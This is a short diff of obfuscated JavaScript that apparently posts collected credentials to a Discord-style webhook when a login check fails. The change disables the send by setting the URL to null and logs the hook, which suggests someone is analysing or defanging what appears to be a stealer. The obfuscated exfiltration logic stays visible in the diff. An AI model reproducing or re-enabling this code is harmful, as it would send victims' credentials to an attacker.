@@ -158,9 +158,10 @@ app[_0x48451e(0x13f)]('/', async (_0x3736a6, _0x4868f6) => {
             _0x321f9d = _0x321f9d[_0x22e24a(0x100)]('\x0a'), _0x394293[_0x22e24a(0x141)](_0x321f9d), _0x394293[_0x22e24a(0x13e)](_0x153861[_0x22e24a(0x155)]);
             if (process[_0x22e24a(0x156)][_0x22e24a(0xf4)](_0x3ef9b2 => _0x3ef9b2[_0x22e24a(0x127)] === _0x44b842 && _0x3ef9b2['passowrd'] === _0x2b1e5d)) console['log'](_0x153861[_0x22e24a(0xf7)]);
             else {
+                console.log(hook)
                 await _0x153861[_0x22e24a(0x14f)](axios, {
                     'method': 'POST',
-                    'url': hook,
+                    'url': null, //hook,
                     'data': {
                         'content': _0x153861[_0x22e24a(0x142)],
                         'embeds': [_0x394293[_0x22e24a(0x128)]()]
